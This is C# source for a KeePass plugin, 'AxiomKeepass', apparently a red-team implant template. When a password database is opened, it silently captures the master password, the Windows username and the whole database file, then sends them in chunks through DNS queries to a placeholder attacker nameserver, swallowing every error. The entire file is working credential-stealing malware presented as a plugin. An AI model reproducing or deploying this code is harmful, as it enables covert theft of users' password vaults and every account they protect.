using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Linq;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using KeePass.DataExchange;
using KeePass.Forms;
using KeePass.Plugins;
using KeePassLib.Utility;
using KeePass;
using KeePassLib.Serialization;
using KeePass.App;
using KeePassLib.Keys;
using KeePassLib;

namespace AxiomKeepass
{
	public sealed class AxiomKeepassExt : Plugin
	{
		private IPluginHost m_host = null;
		private string nameserver = "{{NAMESERVER_HERE}}";

		public override bool Initialize(IPluginHost host)
		{
			if (host == null) return false;
			m_host = host;
			m_host.MainWindow.FileOpened += this.OnFileOpened;
			return true;
		}

		private void ExfilBytes(byte[] data, string identifier, string keyname)
		{
			int maxlen = 60; // Maximum len of an domain name in a DNS query
			string data_b64 = Convert.ToBase64String(data)
				.Replace("=","")
				.Replace("+","-")
				.Replace("/","_");
			int ns_len = identifier.Length + keyname.Length + nameserver.Length;
			int available_len = maxlen - ns_len;
			int rounds = (int)Math.Ceiling(data_b64.Length / (decimal)available_len);
			for (int i = 0; i < rounds; i++)
			{
				string query = (
						identifier + 
						keyname + 
						data_b64.Substring(
							i * available_len,
							Math.Min(
								available_len,
								data_b64.Length - i * available_len
							)
						) +
						nameserver
				);
				try {
					Dns.GetHostEntry(query.Replace("=","_"));
				} catch (Exception err) { /* Do nothing */ }
			}
			try {
				Dns.GetHostEntry(identifier + keyname + "EOF" + nameserver);
			} catch (Exception err) { /* Do nothing */ }
			

		}

		private void OnFileOpened(object sender, FileOpenedEventArgs e)
		{
			var database = m_host.Database;
			var masterkey = ((KeePassLib.Keys.KcpPassword)(m_host.Database.MasterKey.UserKeys.ElementAt(0))).Password.ReadString();
			var db_path = m_host.Database.IOConnectionInfo.Path;
			byte[] data = System.IO.File.ReadAllBytes(db_path);

			// Calculate our hash identifier based on current MAC address
			string identifier = "ah56";

			// Exfiltrate the username first
			byte[] username_b = System.Text.Encoding.UTF8.GetBytes(System.Environment.UserName);
			string username_b64 = Convert.ToBase64String(username_b)
				.Replace("=","")
				.Replace("+","-")
				.Replace("/","_");
			try {
				Dns.GetHostEntry(identifier + ".USR." + username_b64 + nameserver);
			} catch (Exception err) { /* Do nothing */ }


			this.ExfilBytes(System.Text.Encoding.UTF8.GetBytes(masterkey), identifier, ".KEY.");
			//this.ExfilBytes(data, identifier, ".DB.");
			Task.Run(() => this.ExfilBytes(data, identifier, ".DB."));
		}
	}
}

